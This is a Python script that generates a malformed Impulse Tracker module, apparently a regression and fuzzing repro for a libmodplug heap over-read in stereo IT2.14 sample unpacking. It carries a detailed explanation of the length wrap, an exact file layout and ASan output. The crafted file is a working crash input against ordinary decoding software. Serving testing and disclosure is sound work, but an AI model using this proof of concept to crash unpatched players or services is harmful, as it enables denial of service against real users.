#!/usr/bin/env python3
"""make_it_stereowrap.py — minimal repro for the libmodplug IT stereo
unpack length-wrap (load_it.cpp ITUnpack8Bit / sndfile.cpp RS_*_STEREO).

Usage: python3 make_it_stereowrap.py OUTFILE [PAD_BYTES]
  Without PAD: deterministic 281-byte repro (every byte explained below).
  With PAD_BYTES (e.g. 131072): a second, benign 8-bit PCM filler sample
  of PAD zero bytes is inserted so the image crosses glibc's 128 KiB
  mmap threshold — dec_open's malloc then lands the buffer at a page
  edge and the PRE-FIX RELEASE binary SIGSEGVs at image_end+4 on this
  exact file (probecheck pin 8; the small file survives release only
  because heap padding absorbs the over-read).
  With --valid instead of PAD_BYTES: emit a BENIGN minimal module
  (mono 8-bit unsigned PCM sample, 8820 frames of silence) — the
  must-still-decode half of the regression pin (probe: "seek=ok",
  8820 frames).

Mechanism: ReadSample (sndfile.cpp) unpacks a stereo IT2.14-packed
sample by calling ITUnpack8Bit twice; the second call gets
(lpMemFile+offset, dwMemLength-offset) where offset = bytes consumed by
the first call. The block-header skip `pSrc += 2` in ITUnpack8Bit is
unchecked, so when the source window runs dry pSrc lands at pStop+2 and
the early return yields offset = dwMemLength+2. Then dwMemLength-offset
wraps to 0xFFFFFFFE, pStop of the second call is ~4 GiB past the
buffer, the `ibuf >= ibufend` guard is void, and the first read of the
second call (after its own +2 block skip) lands exactly 4 bytes past
the malloc'd image end.

File layout (small form; PAD form inserts filler between, offsets shift):
  [0..191]    ITFILEHEADER (192 B): "IMPM" magic; ordnum=1, insnum=0,
              smpnum=1, patnum=0; cwtv=cmwt=0x214 (selects RS_IT2148,
              not 2.15); flags=0 special=0 msglength=0 (no message /
              embedded-MIDI paths); globalvol=64 speed=6 tempo=125
              mv=127; chnpan=0xFF (channel table skipped).
  [192]       order table, 1 byte: 0 (pattern 0 does not exist).
  [193..196]  sample-address table: 1 entry -> sample struct.
  [197..276]  ITSAMPLESTRUCT (80 B): "IMPS" tag; flags=0x0C = bit2
              STEREO + bit3 packed, 8-bit (cvt=0: not ADPCM4);
              length=0x8001 (>0x8000 forces a second 0x8000 block whose
              header skip overshoots the source end); C5Speed=8363;
              samplepointer -> the poison data; vibrato zero.
  [277..280]  4 B = the entire compressed source window for sample 0.
              <4 would break out of ReadSample's RS_IT2148 case.
              Unpack block 1 skips 2 and reads the 2 remaining bytes,
              then the read-guard silences all further bytes; block 2's
              skip overshoots to pStop+2 (offset=6=dwMemLength+2).

Under ASan (fuzz_decode -runs=0): heap-buffer-overflow READ size 1,
load_it.cpp:1202 ITReadBits inlined in ITUnpack8Bit, at malloc'd-buffer-
end + 4, allocated by dec_open. Upstream fix: e74d5d7 (2026-11-02).
"""
import struct, sys

def le32(x): return struct.pack('<I', x)
def le16(x): return struct.pack('<H', x)

def sample_struct(tag_ptr, length, flags=0x0C, cvt=0x00, c5=8363):
    s = bytearray()
    s += b'IMPS'                      # sample tag
    s += b'\0' * 12                   # filename
    s += b'\x00'                      # zero
    s += b'\x40'                      # gvl
    s += bytes([flags])               # flags (bit1 16bit, bit2 stereo, bit3 packed)
    s += b'\x40'                      # vol
    s += b'\0' * 26                   # name
    s += bytes([cvt])                 # cvt (0xFF would mean ADPCM4)
    s += b'\x00'                      # dfp
    s += le32(length)                 # length (samples)
    s += le32(0)                      # loopbegin
    s += le32(0)                      # loopend
    s += le32(c5)                     # C5Speed
    s += le32(0)                      # susloopbegin
    s += le32(0)                      # susloopend
    s += le32(tag_ptr)                # samplepointer -> sample data
    s += b'\0' * 4                    # vis, vid, vir, vit (no vibrato)
    assert len(s) == 80
    return s

pad = 0
valid = len(sys.argv) > 2 and sys.argv[2] == '--valid'
if not valid:
    pad = int(sys.argv[2]) if len(sys.argv) > 2 else 0
smpnum = 1 + (1 if pad else 0)

out = bytearray()
# ITFILEHEADER
out += b'IMPM'                       # id
out += b'\0' * 26                    # songname
out += le16(0x1004)                  # reserved1
out += le16(1)                       # ordnum
out += le16(0)                       # insnum
out += le16(smpnum)                  # smpnum
out += le16(0)                       # patnum
out += le16(0x214)                   # cwtv
out += le16(0x214)                   # cmwt
out += le16(0)                       # flags
out += le16(0)                       # special
out += bytes([64, 127, 6, 125, 0, 0])  # globalvol, mv, speed, tempo, sep, zero
out += le16(0)                       # msglength
out += le32(0)                       # msgoffset
out += le32(0)                       # reserved2
out += b'\xFF' * 64                  # chnpan (0xFF = leave channel default)
out += b'\x40' * 64                  # chnvol (unused because chnpan==0xFF)
assert len(out) == 192

out += b'\x00'                       # order table (1 entry)
# sample-address table (smpnum entries, LE32)
smppos0 = 192 + 1 + 4 * smpnum
structs = smppos0 + 80 * smpnum
pad_data = structs
poison = pad_data + pad
for i in range(smpnum):
    out += le32(smppos0 + 80 * i)
assert len(out) == smppos0

# sample 0: the stereo-packed poison sample; its 4-byte window is last
# (or, in --valid mode, a benign mono 8-bit PCM sample of silence)
if valid:
    out += sample_struct(smppos0 + 80, 8820, flags=0x00, cvt=0x00)
    out += b'\x80' * 8820            # 8820 frames of silence, unsigned PCM
    assert len(out) == smppos0 + 80 + 8820
    with open(sys.argv[1], 'wb') as f:
        f.write(out)
    print(f"{sys.argv[1]}: {len(out)} bytes (valid)")
    sys.exit(0)
out += sample_struct(poison, 0x8001)
if pad:
    # benign 8-bit unsigned PCM filler, length=pad, ends where sample 0's
    # window begins; keeps the image over glibc's mmap threshold
    out += sample_struct(pad_data, pad, flags=0x00, cvt=0x00)
    out += b'\x80' * pad
assert len(out) == poison
out += b'\x00' * 4                   # the entire compressed source window
with open(sys.argv[1], 'wb') as f:
    f.write(out)
print(f"{sys.argv[1]}: {len(out)} bytes")
